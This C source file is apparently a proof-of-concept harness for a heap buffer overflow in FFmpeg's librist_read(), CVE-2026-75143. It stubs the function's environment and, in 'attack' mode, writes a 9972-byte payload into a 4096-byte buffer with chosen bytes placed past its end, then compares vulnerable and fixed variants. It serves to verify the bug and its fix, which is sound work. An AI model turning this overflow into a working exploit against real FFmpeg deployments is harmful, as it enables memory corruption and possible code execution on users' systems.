/*
 * ffmpeg2shell harness driver (W142, 2026-11-23).
 *
 * Direct-call harness for CVE-2026-75143 / GHSA-7qc3-xqxj-426p. The complete
 * verbatim librist_read() from each byte-exact pinned librist.c blob is
 * #included below; only its external environment (librist, libavutil logging,
 * URLContext, error macros) is stubbed. No FFmpeg process, socket, RIST peer
 * or async thread exists. The destination is a heap buffer of the size the
 * real async wrapper passes (FFMIN(4096, fifo_space), async.c:235 -> :140).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ---------------- stubs for the verbatim function's environment ---------- */
#define POLLING_TIME 10
#define MAX_PAYLOAD_SIZE (10000 - 28)
#define RIST_DATA_FLAGS_OVERFLOW 0x01
#define AV_LOG_ERROR 1
#define EIO 5
#define EAGAIN 11
#define AVERROR(e) (-(e))
#define AVERROR_EXTERNAL (-(5))

#define FFMIN(a, b) ((a) > (b) ? (b) : (a))

typedef struct URLContext {
    void *priv_data;
} URLContext;

typedef struct RISTContext {
    void *ctx;
    int overrun_nonfatal;
} RISTContext;

struct rist_data_block {
    unsigned char *payload;
    int payload_len;
    int flags;
};

static struct rist_data_block g_block;
static int g_read_calls;
static int g_free_calls;
static int g_log_calls;
static int g_overrun_nonfatal;
static int g_read_ret;

static int risterr2ret(int err)
{
    return err;
}

static int rist_receiver_data_read2(void *ctx, struct rist_data_block **db,
                                    int timeout)
{
    (void)ctx;
    (void)timeout;
    g_read_calls++;
    *db = &g_block;
    return g_read_ret;
}

static void rist_receiver_data_block_free2(struct rist_data_block **db)
{
    (void)db;
    g_free_calls++;
}

static void av_log(void *h, int level, const char *fmt, ...)
{
    (void)h;
    (void)level;
    (void)fmt;
    g_log_calls++;
}

/* The four verbatim slices define librist_read() with a pinned #line header. */
#if defined(USE_VULN)
#include "vuln/librist_read.inc"
#elif defined(USE_REL90)
#include "rel90/librist_read.inc"
#elif defined(USE_FIX)
#include "fixed/librist_read.inc"
#elif defined(USE_REL901)
#include "rel901/librist_read.inc"
#else
#error "select a pinned variant with -DUSE_VULN/-DUSE_REL90/-DUSE_FIX/-DUSE_REL901"
#endif

/* Chosen markers land past the 4096-byte caller buffer in the attack mode. */
static const int CHOICE_OFF[8] = { 4096, 4113, 4120, 4128, 4136, 4144, 4152, 4160 };
static const unsigned char CHOICE_VAL[8] = {
    0x41, 0x5a, 0x7a, 0x3c, 0x7b, 0x42, 0x7b, 0x41
};

int main(int argc, char **argv)
{
    static char stdout_buf[32768];
    setvbuf(stdout, stdout_buf, _IOFBF, sizeof(stdout_buf));
    const char *mode = argc > 1 ? argv[1] : "attack";
    int caller_size = 4096;                 /* async.c:235 FFMIN(4096, fifo_space) */
    int payload_len = 9972;                 /* MAX_PAYLOAD_SIZE = 10000-28 */
    unsigned char *payload;
    unsigned char *buf;
    unsigned char *sink;
    RISTContext s;
    URLContext h;
    int ret;
    int i;

    if (strcmp(mode, "arith") == 0) {
        printf("VARIANT=%s MODE=arith PAYLOAD_LEN=%d CALLER_SIZE=%d "
               "OVERFLOW_BYTES=%d MAX_PAYLOAD_SIZE=%d ASYNC_CALLER_CAP=4096\n",
               VARIANT_LABEL, payload_len, caller_size,
               payload_len - caller_size, MAX_PAYLOAD_SIZE);
        return 0;
    }
    if (strcmp(mode, "safe") == 0)
        payload_len = 4;
    if (strcmp(mode, "oversize") == 0)
        payload_len = 9973;

    /* Allocate source first so the destination heap chunk follows it; the
     * driver prints before exiting and never calls free() on either object. */
    payload = (unsigned char *)malloc((size_t)payload_len);
    if (!payload)
        return 90;
    memset(payload, 0x41, (size_t)payload_len);
    payload[0] = 0x41;
    if (payload_len > 4160) {
        payload[17] = 0x5a;
        for (i = 1; i < 8; i++)
            payload[CHOICE_OFF[i]] = CHOICE_VAL[i];
    }

    buf = (unsigned char *)malloc((size_t)caller_size);
    if (!buf)
        return 91;
    memset(buf, 0x00, (size_t)caller_size); /* canary past offset 4095 */

    /* Adjacent heap object absorbs the 5876-byte overflow in plain builds so
     * glibc never sees a corrupted top chunk before the observations print. */
    sink = (unsigned char *)malloc(20000);
    if (!sink)
        return 92;
    memset(sink, 0xCC, 20000);

    g_block.payload = payload;
    g_block.payload_len = payload_len;
    g_block.flags = 0;
    g_read_ret = 1;
    g_overrun_nonfatal = 0;
    s.ctx = (void *)0x1234;
    s.overrun_nonfatal = g_overrun_nonfatal;
    h.priv_data = &s;

    ret = librist_read(&h, buf, caller_size);

    printf("VARIANT=%s MODE=%s PAYLOAD_LEN=%d CALLER_SIZE=%d RET=%d "
           "READ_CALLS=%d FREE_CALLS=%d LOG_CALLS=%d\n",
           VARIANT_LABEL, mode, payload_len, caller_size, ret,
           g_read_calls, g_free_calls, g_log_calls);
    printf("BUF_IN_0=%02x BUF_IN_17=%02x BUF_AT_4095=%02x\n",
           buf[0], buf[17], buf[4095]);
    printf("SINK_DIST=%ld SINK_BYTE_1=%02x SINK_BYTE_8=%02x\n",
           (long)(sink - buf), sink[1], sink[8]);

#ifdef SHOW_SMEAR
    /* Plain builds only: ASan poisons the bytes past the destination, so an
     * observer read there would report a READ before the recorded WRITE. */
    printf("OBS_OFFSET_4096=%02x OBS_OFFSET_4113=%02x OBS_OFFSET_4120=%02x "
           "OBS_OFFSET_4128=%02x OBS_OFFSET_4136=%02x OBS_OFFSET_4144=%02x "
           "OBS_OFFSET_4152=%02x OBS_OFFSET_4160=%02x "
           "OBS_OFFSET_5000=%02x OBS_OFFSET_9000=%02x\n",
           buf[4096], buf[4113], buf[4120], buf[4128],
           buf[4136], buf[4144], buf[4152], buf[4160],
           buf[5000], buf[9000]);
#endif
    return 0;
}
